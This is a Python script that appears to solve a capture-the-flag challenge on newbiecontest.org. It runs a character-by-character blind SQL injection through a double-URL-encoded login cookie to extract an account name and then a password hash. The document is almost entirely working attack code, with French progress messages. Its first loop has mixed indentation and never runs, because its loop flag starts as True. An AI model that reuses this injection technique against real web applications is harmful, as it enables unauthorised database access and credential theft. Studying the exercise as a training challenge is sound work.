import requests

baseUrl = "http://hacking.newbiecontest.org:10080/ep15/index.php"

def tryInjection(login):
    pwd = 'lol'
    cookies = {"login": login, "pass": pwd}

    r = requests.get(baseUrl, cookies=cookies)
    return r.text

alph = "azertyuiopmlkjhgfdsqwxcvbnAQWZSXCDERFVBGTYHNJUIKLOPM"
alphnum = alph + "1234567890"

#
# step1: get the "pseudo"
#
pseudoExtractionLogin_p1 = "admin%2527%2520or%2520SUBSTRING(pseudo%252C1%252C"
pseudoExtractionLogin_p2 = ")%253D%2527"
goodLogin = "Nms"
done = True

while not done:
    print("on commence avec un goodlogin de " + goodLogin)
    for lettre in alphnum:
        done = True
	res =  tryInjection(pseudoExtractionLogin_p1 + str(len(goodLogin) +1) + pseudoExtractionLogin_p2 + goodLogin + lettre)
	if "Aucun compte" not in res:
	    goodLogin += lettre
            print("on avance : so far login = " + goodLogin)
            done = False
            break
    print("on est sortis, goodLogin est a " + goodLogin)
        
print("done with login: " + goodLogin)


# step2: get the password's md5
done = False
pwdExtraction_p1 = "Nms%2527%2520and%2520SUBSTRING(password%252C1%252C"
pwdExtraction_p2 = ")%253D%2527"
goodPwd = ""
while not done:
    print("on commence avec un goodPwd de " + goodPwd)
    for lettre in alphnum:
        done = True
        res = tryInjection(pwdExtraction_p1 + str(len(goodPwd) + 1) + pwdExtraction_p2 + goodPwd + lettre)
        if "Aucun compte" not in res:
            goodPwd += lettre
            print("on avance : so far goodpwd = " + goodPwd)
            done = False
            break
    print("sortis, good pwd = " + goodPwd)

print("done with pwd = " + goodPwd)
